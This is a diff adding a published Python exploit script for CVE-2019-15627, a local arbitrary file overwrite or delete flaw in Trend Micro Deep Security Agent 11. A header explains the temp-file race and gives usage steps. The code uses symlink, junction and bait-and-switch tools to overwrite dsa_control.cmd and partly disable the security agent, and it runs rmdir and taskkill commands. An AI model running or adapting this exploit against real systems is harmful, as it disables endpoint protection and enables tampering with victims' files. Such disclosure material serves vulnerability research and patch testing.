@@ -1,0 +1,106 @@
+# Exploit Title: Trend Micro Deep Security Agent 11 - Arbitrary File Overwrite
+# Exploit Author : Peter Lapp
+# Exploit Date: 2019-12-05
+# Vendor Homepage :  https://www.trendmicro.com/en_us/business.html
+# Link Software : https://help.deepsecurity.trendmicro.com/software.html?regs=NABU&prodid=1716
+# Tested on OS: v11.0.582 and v10.0.3186 on Windows Server 2012 R2, 2008R2, and 7 Enterprise.
+# CVE: 2019-15627
+
+# CVE-2019-15627 - Trend Micro Deep Security Agent Local File Overwrite Exploit by Peter Lapp (lappsec)
+
+# This script uses the symboliclink-testing-tools project, written by James Forshaw ( https://github.com/googleprojectzero/symboliclink-testing-tools )
+# The vulnerability allows an unprivileged local attacker to delete any file on the filesystem, or overwrite it with abritrary data hosted elsewhere (with limitations)
+# This particular script will attempt to overwrite the file dsa_control.cmd with arbitrary data hosted on an external web server, partly disabling TMDS, 
+# even when agent self-protection is turned on. It can also be modified/simplified to simply delete the target file, if desired. 
+
+# When TMDS examines javascript it writes snippets of it to a temporary file, which is locked and then deleted almost immediately.
+# The names of the temp files are sometimes reused, which allows us to predict the filename and redirect to another file.
+# While examining the JS, it generally strips off the first 4096 bytes or so, replaces those with spaces, converts the rest to lowercase and writes it to the temp file. 
+# So the attacker can host a "malicious" page that starts with the normal html and script tags, then fill the rest of the ~4096 bytes with garbage, 
+# then the payload to be written, then a few hundred trailing spaces (not sure why, but they are needed). The resulting temp file will start with 4096 spaces, 
+# and then the lowercase payload. Obviously this has some limitations, like not being able to write binaries, but there are plenty of config files that 
+# are ripe for the writing that can then point to a malicious binary.
+
+# Usage:
+# 1. First you'd need to host your malicious file somewhere. If you just want to delete the target file or overwrite it with garbage, skip this part. 
+# 2. Open a browser (preferrably IE) and start the script
+# 3. Browse to your malicious page (if just deleting the target file, browse to any page with javascript).
+# 4. Keep refreshing the page until you see the script create the target file overwritten.
+#
+# It's a pretty dumb/simple script and won't work every time, so if it doesn't work just run it again. Or write a more reliable exploit. 
+
+
+import time
+import os
+import subprocess
+import sys
+import webbrowser
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+
+class Stage1_Handler(FileSystemEventHandler):
+	def __init__(self):
+		self.filenames = []
+	def on_created(self, event):
+		filename = os.path.basename(event.src_path)
+		if filename in self.filenames:
+			print ('Starting symlink creation.')
+			watcher1.stop()
+			symlinkery(self.filenames)
+		else:
+			self.filenames.append(filename)
+			print ('File %s created.') % filename
+			
+class Stage2_Handler(FileSystemEventHandler):
+	def on_any_event(self, event):
+		if os.path.basename(event.src_path) == 'dsa_control.cmd':
+			print "Target file overwritten/deleted. Cleaning up."
+			subprocess.Popen("taskkill /F /T /IM CreateSymlink.exe", shell=True)
+			subprocess.Popen("taskkill /F /T /IM Baitandswitch.exe", shell=True)
+			os.system('rmdir /S /Q "C:\\ProgramData\\Trend Micro\\AMSP\\temp\\"')
+			os.system('rmdir /S /Q "C:\\test"')
+			os.rename('C:\\ProgramData\\Trend Micro\\AMSP\\temp-orig','C:\\ProgramData\\Trend Micro\\AMSP\\temp')
+			watcher2.stop()
+			sys.exit(0)
+			
+class Watcher(object):
+	def __init__(self, event_handler, path_to_watch):
+		self.event_handler = event_handler
+		self.path_to_watch = path_to_watch
+		self.observer = Observer()
+	def run(self):
+		self.observer.schedule(self.event_handler(), self.path_to_watch)
+		self.observer.start()
+		try:
+			while True:
+				time.sleep(1)
+		except KeyboardInterrupt:
+			self.observer.stop()
+
+		self.observer.join()
+	def stop(self):
+		self.observer.stop()
+		
+def symlinkery(filenames):
+	print "Enter symlinkery"
+	for filename in filenames:
+		print "Creating symlink for %s" % filename
+		cmdname = "start cmd /c CreateSymlink.exe \"C:\\test\\virus\\%s\" \"C:\\test\\test\\symtarget\"" % filename
+		subprocess.Popen(cmdname, shell=True)
+	os.rename('C:\\ProgramData\\Trend Micro\\AMSP\\temp','C:\\ProgramData\\Trend Micro\\AMSP\\temp-orig')
+	os.system('mklink /J "C:\\ProgramData\\Trend Micro\\AMSP\\temp" C:\\test')
+	watcher2.run()
+	print "Watcher 2 started"
+
+try:
+        os.mkdir('C:\\test')
+except:
+        pass
+
+path1 = 'C:\\ProgramData\\Trend Micro\\AMSP\\temp\\virus'
+path2 = 'C:\\Program Files\\Trend Micro\\Deep Security Agent\\'
+watcher1 = Watcher(Stage1_Handler,path1)
+watcher2 = Watcher(Stage2_Handler,path2)
+switcheroo = "start cmd /c BaitAndSwitch.exe C:\\test\\test\\symtarget \"C:\\Program Files\\Trend Micro\\Deep Security Agent\\dsa_control.cmd\" \"C:\\windows\\temp\\deleteme.txt\" d"
+subprocess.Popen(switcheroo, shell=True)
+watcher1.run()
